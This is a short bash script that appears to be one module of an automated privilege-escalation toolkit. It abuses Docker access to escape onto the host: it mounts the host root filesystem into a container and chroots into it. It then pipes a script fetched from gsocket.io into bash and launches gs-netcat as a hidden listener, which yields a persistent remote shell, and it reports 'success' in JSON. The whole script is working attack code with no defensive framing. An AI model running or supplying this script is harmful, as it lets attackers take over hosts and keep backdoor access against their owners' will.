#!/bin/bash
source "$(dirname "$0")/00_common.sh"
METHOD="docker"
info "Checking Docker..."
id|grep -q docker || [ -w /var/run/docker.sock ] || { result_json "$METHOD" "skip" "No docker access"; exit 1; }
command -v docker &>/dev/null || { result_json "$METHOD" "skip" "Docker not installed"; exit 1; }
secret=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20)
docker run -v /:/mnt --rm alpine chroot /mnt /bin/sh -c "curl -sSL gsocket.io/y|bash;nohup gs-netcat -s '$secret' -l -i &" 2>/dev/null && { result_json "$METHOD" "success" "Container escape" "$secret"; exit 0; }
result_json "$METHOD" "fail" "Docker escape failed"; exit 1
